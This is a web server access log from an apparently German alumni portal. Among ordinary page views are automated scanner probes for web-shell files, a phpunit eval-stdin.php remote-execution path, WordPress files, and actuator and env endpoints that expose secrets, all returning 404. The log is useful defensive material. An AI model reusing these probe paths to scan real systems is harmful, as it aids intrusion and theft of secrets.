user;timestamp;referer;target;method;status
f980c5369cb972aafdf9c0c14ed10e9b6e2eaa9e2be40d7675355f8fbf1e2aa8;2025-11-27 00:34:52;;/wp-includes/style-engine/about.php;GET;404
f980c5369cb972aafdf9c0c14ed10e9b6e2eaa9e2be40d7675355f8fbf1e2aa8;2025-11-27 00:34:53;;/ww1.php;GET;404
f980c5369cb972aafdf9c0c14ed10e9b6e2eaa9e2be40d7675355f8fbf1e2aa8;2025-11-27 00:34:53;;/qqq.php;GET;404
f980c5369cb972aafdf9c0c14ed10e9b6e2eaa9e2be40d7675355f8fbf1e2aa8;2025-11-27 00:34:54;;/about/function.php;GET;404
f980c5369cb972aafdf9c0c14ed10e9b6e2eaa9e2be40d7675355f8fbf1e2aa8;2025-11-27 00:34:54;;/admin/function.php;GET;404
f980c5369cb972aafdf9c0c14ed10e9b6e2eaa9e2be40d7675355f8fbf1e2aa8;2025-11-27 00:34:55;;/css/colors/blue/index.php;GET;404
f980c5369cb972aafdf9c0c14ed10e9b6e2eaa9e2be40d7675355f8fbf1e2aa8;2025-11-27 00:34:56;;/security.php;GET;404
f980c5369cb972aafdf9c0c14ed10e9b6e2eaa9e2be40d7675355f8fbf1e2aa8;2025-11-27 00:34:57;;/wp-admin/user/about.php;GET;404
f980c5369cb972aafdf9c0c14ed10e9b6e2eaa9e2be40d7675355f8fbf1e2aa8;2025-11-27 00:34:58;;/wp-admin/js/index.php;GET;404
f980c5369cb972aafdf9c0c14ed10e9b6e2eaa9e2be40d7675355f8fbf1e2aa8;2025-11-27 00:34:59;;/wp-content/upgrade/about.php;GET;404
f980c5369cb972aafdf9c0c14ed10e9b6e2eaa9e2be40d7675355f8fbf1e2aa8;2025-11-27 00:34:59;;/wp-includes/assets/index.php;GET;404
f980c5369cb972aafdf9c0c14ed10e9b6e2eaa9e2be40d7675355f8fbf1e2aa8;2025-11-27 00:35:00;;/wp-content/radio.php;GET;404
f980c5369cb972aafdf9c0c14ed10e9b6e2eaa9e2be40d7675355f8fbf1e2aa8;2025-11-27 00:35:01;;/wp-includes/fonts/index.php?p=;GET;404
f980c5369cb972aafdf9c0c14ed10e9b6e2eaa9e2be40d7675355f8fbf1e2aa8;2025-11-27 00:35:02;;/.well-known/admin.php;GET;404
f980c5369cb972aafdf9c0c14ed10e9b6e2eaa9e2be40d7675355f8fbf1e2aa8;2025-11-27 00:35:03;;/wp-content/admin.php;GET;404
f980c5369cb972aafdf9c0c14ed10e9b6e2eaa9e2be40d7675355f8fbf1e2aa8;2025-11-27 00:35:04;;/wp-content/plugins/admin.php;GET;404
f980c5369cb972aafdf9c0c14ed10e9b6e2eaa9e2be40d7675355f8fbf1e2aa8;2025-11-27 00:35:04;;/wp-content/themes/twentytwentytwo/index.php?p=;GET;404
f980c5369cb972aafdf9c0c14ed10e9b6e2eaa9e2be40d7675355f8fbf1e2aa8;2025-11-27 00:35:05;;/.well-known/log.php;GET;404
f980c5369cb972aafdf9c0c14ed10e9b6e2eaa9e2be40d7675355f8fbf1e2aa8;2025-11-27 00:35:06;;/class.php;GET;404
f980c5369cb972aafdf9c0c14ed10e9b6e2eaa9e2be40d7675355f8fbf1e2aa8;2025-11-27 00:35:07;;/bless5.php;GET;404
f980c5369cb972aafdf9c0c14ed10e9b6e2eaa9e2be40d7675355f8fbf1e2aa8;2025-11-27 00:35:08;;/wp-includes/js/codemirror/index.php;GET;404
f980c5369cb972aafdf9c0c14ed10e9b6e2eaa9e2be40d7675355f8fbf1e2aa8;2025-11-27 00:35:09;;/wp-includes/block-patterns/index.php;GET;404
f980c5369cb972aafdf9c0c14ed10e9b6e2eaa9e2be40d7675355f8fbf1e2aa8;2025-11-27 00:35:09;;/lock360.php;GET;404
f980c5369cb972aafdf9c0c14ed10e9b6e2eaa9e2be40d7675355f8fbf1e2aa8;2025-11-27 00:35:10;;/f35.php;GET;404
f980c5369cb972aafdf9c0c14ed10e9b6e2eaa9e2be40d7675355f8fbf1e2aa8;2025-11-27 00:35:11;;/Wop.php;GET;404
f980c5369cb972aafdf9c0c14ed10e9b6e2eaa9e2be40d7675355f8fbf1e2aa8;2025-11-27 00:35:12;;/mom.php;GET;404
f980c5369cb972aafdf9c0c14ed10e9b6e2eaa9e2be40d7675355f8fbf1e2aa8;2025-11-27 00:35:13;;/Sh3ll.php;GET;404
f980c5369cb972aafdf9c0c14ed10e9b6e2eaa9e2be40d7675355f8fbf1e2aa8;2025-11-27 00:35:13;;/%E5%B9%B3%E4%BB%AE%E5%90%8Ds.php;GET;404
f980c5369cb972aafdf9c0c14ed10e9b6e2eaa9e2be40d7675355f8fbf1e2aa8;2025-11-27 00:35:14;;/frg.php;GET;404
f980c5369cb972aafdf9c0c14ed10e9b6e2eaa9e2be40d7675355f8fbf1e2aa8;2025-11-27 00:35:15;;/to.php;GET;404
f980c5369cb972aafdf9c0c14ed10e9b6e2eaa9e2be40d7675355f8fbf1e2aa8;2025-11-27 00:35:16;;/bge.php;GET;404
f980c5369cb972aafdf9c0c14ed10e9b6e2eaa9e2be40d7675355f8fbf1e2aa8;2025-11-27 00:35:17;;/ifm.php;GET;404
f980c5369cb972aafdf9c0c14ed10e9b6e2eaa9e2be40d7675355f8fbf1e2aa8;2025-11-27 00:35:18;;/ww5.php;GET;404
f980c5369cb972aafdf9c0c14ed10e9b6e2eaa9e2be40d7675355f8fbf1e2aa8;2025-11-27 00:35:18;;/ioxi-o1.php;GET;404
f980c5369cb972aafdf9c0c14ed10e9b6e2eaa9e2be40d7675355f8fbf1e2aa8;2025-11-27 00:35:19;;/juuuu.php;GET;404
f980c5369cb972aafdf9c0c14ed10e9b6e2eaa9e2be40d7675355f8fbf1e2aa8;2025-11-27 00:35:20;;/ha.php;GET;404
f980c5369cb972aafdf9c0c14ed10e9b6e2eaa9e2be40d7675355f8fbf1e2aa8;2025-11-27 00:35:21;;/waw.php;GET;404
f980c5369cb972aafdf9c0c14ed10e9b6e2eaa9e2be40d7675355f8fbf1e2aa8;2025-11-27 00:35:22;;/gg.php;GET;404
f980c5369cb972aafdf9c0c14ed10e9b6e2eaa9e2be40d7675355f8fbf1e2aa8;2025-11-27 00:35:22;;/we2.php;GET;404
f980c5369cb972aafdf9c0c14ed10e9b6e2eaa9e2be40d7675355f8fbf1e2aa8;2025-11-27 00:35:23;;/04.php;GET;404
f980c5369cb972aafdf9c0c14ed10e9b6e2eaa9e2be40d7675355f8fbf1e2aa8;2025-11-27 00:35:24;;/333.php;GET;404
f980c5369cb972aafdf9c0c14ed10e9b6e2eaa9e2be40d7675355f8fbf1e2aa8;2025-11-27 00:35:25;;/520.php;GET;404
f980c5369cb972aafdf9c0c14ed10e9b6e2eaa9e2be40d7675355f8fbf1e2aa8;2025-11-27 00:35:26;;/ar.php;GET;404
f980c5369cb972aafdf9c0c14ed10e9b6e2eaa9e2be40d7675355f8fbf1e2aa8;2025-11-27 00:35:26;;/lts.php;GET;404
f980c5369cb972aafdf9c0c14ed10e9b6e2eaa9e2be40d7675355f8fbf1e2aa8;2025-11-27 00:35:27;;/x.php;GET;404
f980c5369cb972aafdf9c0c14ed10e9b6e2eaa9e2be40d7675355f8fbf1e2aa8;2025-11-27 00:35:28;;/xx.php;GET;404
96b04319f791c3da19bc84913f09e678f079914c02c5c58a35aa80df27ca79c4;2025-11-27 00:36:34;;/personen/alumni/schule/HB0001;GET;200
9fb41a111a7583422e066521d5bf29ad592b12a22e9f2e3d37db940781a75ffe;2025-11-27 00:38:10;/gruppen/hobby/debattieren;/gruppen/interesse/projektmanagement;GET;200
b3a04d2cdb31b5fdcc1ced32ea0f3e1232acd42d7578bb03b22d26569da0b30d;2025-11-27 00:38:58;;/themen/details/abschied-aus-moabit;GET;200
f38a109ae57e12e35321944f0fc0fbfa28762b997d6adc68a3c1f20bc0f26123;2025-11-27 00:44:59;;/personen/alumni/schule/07A05;GET;200
3f1daae1a4e9c517ed8ef93173932473f6eebe8d0183ad8c4b4e2e8bdbd18229;2025-11-27 00:48:02;;/themen/details/uni-zwischen-ebbe-und-flut;GET;200
6a597af15cac5754dd91a1c32477527d9f6b93d276cea5a899ddcc934e374c96;2025-11-27 00:51:20;;/aktuelles/meldungen/details/alumni-portal-des-zbw-geht-an-den-start;GET;200
76d94f697b816613caac852f8ffb55b787af303bd0fa77300bacb92d7ff8d245;2025-11-27 00:56:34;;/personen/alumni/schule/5501;GET;200
c9585288179f168330fe4bccba2c3c8dbc443e70cb9617ce2b06ed1c29134ed3;2025-11-27 00:59:30;;/aktuelles/meldungen/details/hackerangriff-lauft-ins-leere;GET;200
7af86b19ce5c484390bba1a725ba71f3b46cda9066ef0abbab7ba157c2e92bc3;2025-11-27 01:02:57;/project/default;/project/default;GET;404
073370b3b7498ce5ff97a68a9ef59445e44e7ae48929407a11be0f8cce1e0c31;2025-11-27 01:03:40;/;/;GET;200
51a11cdb06877f1ba9d99ed8e29e85b74fb9168f014b6af44469b66066375172;2025-11-27 01:07:09;;/themen/details/wenn-sicherheit-sichtbar-wird;GET;200
870266b3bc6d35538988d332d6515dac9d64f14558356345a909d20a2ab35c16;2025-11-27 01:07:13;;/shell.php;GET;404
870266b3bc6d35538988d332d6515dac9d64f14558356345a909d20a2ab35c16;2025-11-27 01:07:13;;/webshell;GET;404
9cbd4524dd577ff45ba5e71a117282c955d2feb8538fb550433c8f931ee963b2;2025-11-27 01:07:32;;/webshell.php;GET;404
5d805f0740041f39c329cf9634ba9cd4c8175fc53fbc96efc6594037872bc198;2025-11-27 01:16:30;/gruppen/hobby/debattieren;/gruppen/hobby/logikspiele;GET;302
5d805f0740041f39c329cf9634ba9cd4c8175fc53fbc96efc6594037872bc198;2025-11-27 01:16:31;/gruppen/hobby/debattieren;/gruppen;GET;200
0dae01c61ca3bde4d48d92b0c9ca2ad29380e619a28106ee2fed8f1d36ddeb0d;2025-11-27 01:17:42;;/shell;GET;404
25b2e9a539e75650de289b930c539f25f6bb130d2b8c9d3b39a736576847339f;2025-11-27 01:18:08;;/personen/alumni/schule/600027;GET;200
82328f5d32ab047a6a42de6c81bb8adcb8324dd1b10de5ee991b3b0a1593870f;2025-11-27 01:18:38;;/personen/alumni/schule/9002;GET;200
bbdced1c2032d061c920aa5d349fadc41a17ade0dbc74892411800c3e813ce3e;2025-11-27 01:18:42;;/personen;GET;200
bbdced1c2032d061c920aa5d349fadc41a17ade0dbc74892411800c3e813ce3e;2025-11-27 01:23:40;;/aktuelles/stellenangebote;GET;200
5d06ed8cfcc2fc53c12800f0a1931005367a4917c066e5e22a2a591e0fb0cb1a;2025-11-27 01:23:44;/;/;PROPFIND;405
134cba92c18851f657be36af57bada7907c8ddde6c4ca4e1cdf66bcb33876a57;2025-11-27 01:25:48;;/;GET;200
f9d6fd0eca98c1190ede142162501012a3b195bc4d1a7f52c0afb049a1f90dc8;2025-11-27 01:26:23;;/personen/alumni/schule/MP003;GET;200
898dadbe3663b29c0519ce0b36d243c0f5c2d51ea43962ac7b1b9bdda4c25f35;2025-11-27 01:36:34;;/personen/alumni/schule/164045;GET;200
02e2f1393eb797f954fde586da58e8b3b44e5dbdecaba0160b1020eba89f1e91;2025-11-27 01:38:07;/actuator/gateway/routes;/actuator/gateway/routes;GET;404
9b06b22df948a0ac6e7b476490cfbd5c04e2a6c305b4c88605095120aa8fba2d;2025-11-27 01:44:40;;/personen/alumni/details/asja-apelt-genannt-henze;GET;200
48c31a3bdca03ba471bbfc3b6d4587d5863e8c938f54c02764c85fbef591b991;2025-11-27 01:44:42;;/veranstaltungen/details/wohnzimmerkonzert;GET;200
ebf07fbebbaf6b18ab7315bd48406b44ebb680ff7b450ac2384d3d10ba97d3cb;2025-11-27 01:49:26;/gruppen/hobby/debattieren;/personen/alumni/schule/185826;GET;200
5d805f0740041f39c329cf9634ba9cd4c8175fc53fbc96efc6594037872bc198;2025-11-27 01:50:49;/personen/alumni/details/luca-onorini;/personen/alumni/details/luca-onorini;GET;200
ebf07fbebbaf6b18ab7315bd48406b44ebb680ff7b450ac2384d3d10ba97d3cb;2025-11-27 01:52:14;/gruppen/interesse/selbststandigkeit;/personen/alumni/details/heidi-burghard;GET;200
78f9df41e926a0929bb7a240236d79711bb6d51ae1bbb356932ce2d649e59cc1;2025-11-27 01:54:25;;/;GET;200
7a1dd6bf7f68efa7bdf85d9a71a7398d3168d5d7b14cf023ccedc46d49fa287b;2025-11-27 01:54:45;;/aktuelles/meldungen/details/alumni-portal-des-zbw-geht-an-den-start;GET;200
094939c7719a27c29c2962f0d1e3c4bfc8f018ef1720f8b630feb5b2ad7dd40b;2025-11-27 01:56:53;;/themen;GET;200
f7deb2034dd675dac7f0e186f972826ccc3c7d36fcb76a233e8730d61885c6de;2025-11-27 02:01:21;;/;GET;200
6a26251cb5a8693f6ef808fe5e437239f654ec5721571e31fe63573f906dd296;2025-11-27 02:01:22;/;/;GET;200
9f70c1e91e0ebc52e66f96cba9bb4e014d56e8a305a09092c6aac325f22655aa;2025-11-27 02:06:54;;/gruppen;GET;200
4904847a92a45c1f8dd26da13104830b343b78cd7be4b582219c20ad9fcfc7b3;2025-11-27 02:06:59;;/;GET;200
a90af479bd045b3f0e04d85f562a143e716d3a6432a40d24e753da352ee244c2;2025-11-27 02:07:28;;/;GET;200
e299a457c8ce30eb650f886a4a840e3e8473f00d296eda985553cec99043d595;2025-11-27 02:09:29;;/personen/alumni/schule/09A05;GET;200
e3ddcae0458c2d63a789850675e0350acbd912c21fd0ec0a72bf656ca3152521;2025-11-27 02:11:52;;/.well-known/traffic-advice;GET;404
e2162d55385d078ff4895471427c0417016ff2943881fda097b162c8b83ad719;2025-11-27 02:11:52;/;/personen/alumni/schule/5503;GET;200
6da684d88bf7ee04b7d0dace8c20402492572d32e8d270604b62d85a6fd7c0d5;2025-11-27 02:14:28;/;/;GET;200
a422fd29867c5aa4f3a2b33ff75cdc7c36989324ec36b5d6ab188354bf23de57;2025-11-27 02:14:38;;/personen/alumni/schule/5502;GET;200
8c009619b3f16f789bb54f8cbaa0f96f12de51853b529aff5ba5ac5ad1be6175;2025-11-27 02:15:11;/themen/details/fotografie-als-kunst-und-ausdruck;/themen/details/fotografie-als-kunst-und-ausdruck;GET;200
f4fd9511324d2a5161037dcb7041037e177c1271abb78efc1203ae4118191533;2025-11-27 02:15:41;;/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php;GET;404
2a89c1a24e237b8ee8c3ffd08281444b4b2ef7a7565d86edd24652f2aedc2b84;2025-11-27 02:19:48;;/;GET;200
afc45b3c9ae544346539a204f5c3f58b451be58760448f2843f4fa2048c8e8ab;2025-11-27 02:25:14;;/personen/alumni/schule/5507;GET;200
138fc50186f92c8a518c5dab8fce9c2e490bd06e5c41fb2466351bf998bf6fe7;2025-11-27 02:40:24;;/personen/alumni/schule/164094;GET;200
e299a457c8ce30eb650f886a4a840e3e8473f00d296eda985553cec99043d595;2025-11-27 02:43:07;;/veranstaltungen/details/wartende-das-theaterstuck;GET;200
a47ddee18cc84a128b3c13947fea6ba599834179bd094b38b96f35f648f67813;2025-11-27 02:44:29;;/;GET;200
f24d1909caea35c97685618b89a62a5847bffca73091a5173f5c01f6efaee5f1;2025-11-27 02:55:32;;/personen/alumni/schule/9004;GET;200
6c7cbda7ee584685f46b25f260010a044c89b8c16ecc4ba5535c50b6839a0e11;2025-11-27 02:56:02;;/;GET;200
92394453b02b4f8efb5e561f19ee6b51f2847a80761170f558e60d5a0685395b;2025-11-27 02:58:48;;/;GET;200
72060e5d0a8556a921ac610974ce22e2134b6b2775914ce4079efa5dad7d48cf;2025-11-27 03:01:15;;/;GET;200
8d3977cc0c065efc6aa79191cc6bb61da266b6475b885a3028f0ae780706a82e;2025-11-27 03:06:16;;/;GET;200
c717e8c0ea77dec413e7ae063fa838a8b532971c3fe37a52bdf6bde6d17461fa;2025-11-27 03:14:10;;/personen/alumni/schule/5506;GET;200
a8af28b08813ebb857698ae3537e331ff55414dabe2a5972781925fb673af78f;2025-11-27 03:14:46;;/personen/alumni/schule/65262;GET;200
d5c17729f33c534ac873627574687f6bff47433df74b990ee5071be32e13ffed;2025-11-27 03:20:46;;/veranstaltungen/details/sommerfest-am-treptow-kolleg;GET;200
c9585288179f168330fe4bccba2c3c8dbc443e70cb9617ce2b06ed1c29134ed3;2025-11-27 03:24:23;;/;GET;200
68802343cefad432d6ee14ab959d7d77183159d4d23bc11bd0566806ae86cbc5;2025-11-27 03:26:31;;/personen/alumni/schule/183052;GET;200
020326332b014b5f341c91c2156fa2c56029f4ea4d9bebeeb8f9d4cf510b96fe;2025-11-27 03:29:02;;/;GET;200
6f2d6295da47c900084b6f95eef82dc453ec6827c11125be7b504b5314aa9ae6;2025-11-27 03:34:06;;/;GET;200
6f2d6295da47c900084b6f95eef82dc453ec6827c11125be7b504b5314aa9ae6;2025-11-27 03:34:06;;/wp-content/plugins/fix/up.php;GET;404
6f2d6295da47c900084b6f95eef82dc453ec6827c11125be7b504b5314aa9ae6;2025-11-27 03:34:06;www.google.com;/wp-content/themes/seotheme/db.php?u;GET;404
6f2d6295da47c900084b6f95eef82dc453ec6827c11125be7b504b5314aa9ae6;2025-11-27 03:34:06;www.google.com;/wp-content/themes/seotheme/db.php?u;GET;404
6f2d6295da47c900084b6f95eef82dc453ec6827c11125be7b504b5314aa9ae6;2025-11-27 03:34:06;www.google.com;/jjlmbnjv.php?Fox=d3wL7;GET;404
dbe63711450736a40340e49c6a48fd54898508b8a4aafce76cfd42551cc2facf;2025-11-27 03:35:13;;/;GET;200
50a94e51fb94466824eb65f4960c26533fb0ba45178a26664e298f637dfac8bc;2025-11-27 03:35:43;;/;GET;200
da256bafad94b7f3c50578b3bd7944231cb61758d5c15a751df30f3f73f6261c;2025-11-27 03:37:12;;/;GET;200
0720e93c279e3af3fd7d18178f7d9428f0a870dcb170ae77781550d08ba3bbf6;2025-11-27 03:51:59;;/personen/alumni/schule/170690;GET;200
72c37cae1ebb5854cc176471d63fcd7773d264b73c180145dc1cebfe6ab06ef6;2025-11-27 03:56:37;;/;GET;200
72c37cae1ebb5854cc176471d63fcd7773d264b73c180145dc1cebfe6ab06ef6;2025-11-27 04:02:30;;/webui/;GET;404
2e6f17e8eda69468df5ce2370ff422dc5b54dcb9a0ee8e3cf42afffb5fa70103;2025-11-27 04:05:58;/themen/details/gemeinsam-stark-organisiert;/themen/details/gemeinsam-stark-organisiert;GET;200
36332950389ce0afb2f9d4a3a18890dd2797ee1ff7f28f6fa4f905ae1520428a;2025-11-27 04:06:11;;/;GET;200
027d9143c17de5a8db981f7263b5df517ffba8f980138092a9b86b42dbe997ba;2025-11-27 04:08:02;;/;GET;200
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-27 04:17:37;/env;/env;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-27 04:17:41;/mappings.json;/mappings.json;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-27 04:17:45;/info;/info;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-27 04:17:48;/env.json;/env.json;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-27 04:17:52;/actuator/;/actuator/;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-27 04:17:56;/actuator/mappings;/actuator/mappings;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-27 04:18:00;/staging/mappings;/staging/mappings;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-27 04:18:04;/staging/actuator/env;/staging/actuator/env;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-27 04:18:09;/staging/actuator/mappings;/staging/actuator/mappings;GET;404
72c37cae1ebb5854cc176471d63fcd7773d264b73c180145dc1cebfe6ab06ef6;2025-11-27 04:21:08;;/geoserver/web/;GET;404
1e8728677d4c953b723a1fc6ddcadefd8cc96cc5db939c175414b34555ec1911;2025-11-27 04:22:14;;/personen/alumni/schule/59026;GET;200
301e666ea0c944e347b624f4972b2b977e5cdb3645f451e1a71103667a2da7a8;2025-11-27 04:32:12;;/personen/alumni/schule/4240016;GET;200
9f0370abd905eb6086fac5f88d4d3425690ffaaf1c38341818bda8bd0be260df;2025-11-27 04:32:29;;/;GET;200
257189213b085b54dbed604f602dc23a5afc24daa64b61eadbb633e6377a0cf8;2025-11-27 04:36:20;;/gruppen;GET;200
6e1b8c1cc0fd38249353d9dc67e5098cff65e41496efd68a1c9c2f7712af3302;2025-11-27 04:42:35;;/;GET;200
6e1b8c1cc0fd38249353d9dc67e5098cff65e41496efd68a1c9c2f7712af3302;2025-11-27 04:42:36;;//wp-includes/wlwmanifest.xml;GET;404
6e1b8c1cc0fd38249353d9dc67e5098cff65e41496efd68a1c9c2f7712af3302;2025-11-27 04:42:36;;//xmlrpc.php?rsd;GET;404
6e1b8c1cc0fd38249353d9dc67e5098cff65e41496efd68a1c9c2f7712af3302;2025-11-27 04:42:36;;/;GET;200
6e1b8c1cc0fd38249353d9dc67e5098cff65e41496efd68a1c9c2f7712af3302;2025-11-27 04:42:37;;//blog/wp-includes/wlwmanifest.xml;GET;404
6e1b8c1cc0fd38249353d9dc67e5098cff65e41496efd68a1c9c2f7712af3302;2025-11-27 04:42:37;;//web/wp-includes/wlwmanifest.xml;GET;404
6e1b8c1cc0fd38249353d9dc67e5098cff65e41496efd68a1c9c2f7712af3302;2025-11-27 04:42:37;;//wordpress/wp-includes/wlwmanifest.xml;GET;404
6e1b8c1cc0fd38249353d9dc67e5098cff65e41496efd68a1c9c2f7712af3302;2025-11-27 04:42:37;;//website/wp-includes/wlwmanifest.xml;GET;404
6e1b8c1cc0fd38249353d9dc67e5098cff65e41496efd68a1c9c2f7712af3302;2025-11-27 04:42:38;;//wp/wp-includes/wlwmanifest.xml;GET;404
6e1b8c1cc0fd38249353d9dc67e5098cff65e41496efd68a1c9c2f7712af3302;2025-11-27 04:42:38;;//news/wp-includes/wlwmanifest.xml;GET;404
6e1b8c1cc0fd38249353d9dc67e5098cff65e41496efd68a1c9c2f7712af3302;2025-11-27 04:42:38;;//2018/wp-includes/wlwmanifest.xml;GET;404
6e1b8c1cc0fd38249353d9dc67e5098cff65e41496efd68a1c9c2f7712af3302;2025-11-27 04:42:38;;//2019/wp-includes/wlwmanifest.xml;GET;404
0de2f958718a9b9718882e6c0c9c9c450e0f0fe0505392332b13c46b35000648;2025-11-27 04:42:38;;/personen/alumni/schule/4340014;GET;200
6e1b8c1cc0fd38249353d9dc67e5098cff65e41496efd68a1c9c2f7712af3302;2025-11-27 04:42:38;;//shop/wp-includes/wlwmanifest.xml;GET;404
6e1b8c1cc0fd38249353d9dc67e5098cff65e41496efd68a1c9c2f7712af3302;2025-11-27 04:42:39;;//wp1/wp-includes/wlwmanifest.xml;GET;404
6e1b8c1cc0fd38249353d9dc67e5098cff65e41496efd68a1c9c2f7712af3302;2025-11-27 04:42:39;;//test/wp-includes/wlwmanifest.xml;GET;404
6e1b8c1cc0fd38249353d9dc67e5098cff65e41496efd68a1c9c2f7712af3302;2025-11-27 04:42:39;;//media/wp-includes/wlwmanifest.xml;GET;404
6e1b8c1cc0fd38249353d9dc67e5098cff65e41496efd68a1c9c2f7712af3302;2025-11-27 04:42:39;;//wp2/wp-includes/wlwmanifest.xml;GET;404
6e1b8c1cc0fd38249353d9dc67e5098cff65e41496efd68a1c9c2f7712af3302;2025-11-27 04:42:40;;//site/wp-includes/wlwmanifest.xml;GET;404
6e1b8c1cc0fd38249353d9dc67e5098cff65e41496efd68a1c9c2f7712af3302;2025-11-27 04:42:40;;//cms/wp-includes/wlwmanifest.xml;GET;404
6e1b8c1cc0fd38249353d9dc67e5098cff65e41496efd68a1c9c2f7712af3302;2025-11-27 04:42:40;;//sito/wp-includes/wlwmanifest.xml;GET;404
e5f108e496fc21f38688c1e1d65f683962e635f7badff987b0dc7c87c6f77194;2025-11-27 04:45:54;;/personen/alumni/details/kai-ingo-heidbuchel;GET;200
b1bc33fe84d17d81bd374afe9fff4e9b12c487fa28d443cb6230debb9d4a46af;2025-11-27 04:48:14;;/sitemap.html;GET;404
456250f9d41a64a2fa0ddb54db4ff4d9e06096219424657e9cf3eee786e49b30;2025-11-27 04:48:20;;/themen/details/der-start-ins-studium;GET;200
3f8a7625906793f843318b1a273de2f7ff563bbdc98e9eebb9e3b3a8f4f12190;2025-11-27 04:53:05;;/suchergebnisse;GET;302
e59614aeee7e37f1335e4cd8c7312d190d295b1a93a94141ca5a6e98ee6c0b5c;2025-11-27 04:53:06;;/sitemap.xml;GET;200
3f8a7625906793f843318b1a273de2f7ff563bbdc98e9eebb9e3b3a8f4f12190;2025-11-27 04:53:08;/suchergebnisse;/;GET;200
cb72eb0418ace7654c405e92adb4499de145cca21b9ee066584a01bf159be363;2025-11-27 04:56:08;;/aktuelles/stellenangebote;GET;200
84fcbca8405de09613e59cfbb3e1129008c1b6f4818091b532dc8f1383145418;2025-11-27 05:04:52;;/;GET;200
165376da2735949a3547f555fe21fa16ca4c9a243fb9f23f2549d888a7b4dac9;2025-11-27 05:06:20;/;/;GET;200
6021b1711b8202c546591aeab994df554abed1afa699b76cd1a1fe16a0bd587a;2025-11-27 05:08:16;;/htmx/get;GET;405
707acdec77b168e3ca717d17615da5c431cf069f729a299ab33262918dc9504f;2025-11-27 05:08:46;;/aktuelles/meldungen/details/hackerangriff-lauft-ins-leere;GET;200
5faf8553cadde70bad2a5bb8cd2311dc8533945585091a09594fff0382e70754;2025-11-27 05:08:50;/;/;GET;200
5faf8553cadde70bad2a5bb8cd2311dc8533945585091a09594fff0382e70754;2025-11-27 05:09:02;/sitemap.xml;/sitemap.xml;GET;200
e6b9c298631270b805d7e9bc903567ef42e68c22f752ab9524781747e8a7c191;2025-11-27 05:14:33;;/themen/details/abschied-aus-moabit;GET;200
f833e6935f97cd4b9d2e6d42a6a4f07403f6bc0a68bcf1ce7ad3c48a50befb13;2025-11-27 05:17:13;;/aktuelles/meldungen/details/alumni-portal-des-zbw-geht-an-den-start;GET;200
cdba9cd45d5a48f26b2fe2ac4ddcd59ebc21dd941868632713695832bb592f7a;2025-11-27 05:24:50;;/aktuelles/meldungen/details/start-der-open-beta-jetzt-anmelden-und-testen;GET;200
4758c3e4756271415ad0bbd32c721b3784e39d16060415499f2fb9fd6f49e870;2025-11-27 05:25:26;;/themen/details/david-gegen-goliath;GET;200
68802343cefad432d6ee14ab959d7d77183159d4d23bc11bd0566806ae86cbc5;2025-11-27 05:36:01;;/themen/details/abschied-aus-moabit;GET;200
d434b05b4bffcc5dbc96e85c0bbca469321c7ab87e29ec83280cd45bf6058760;2025-11-27 05:36:45;;/themen?category=bildung;GET;200
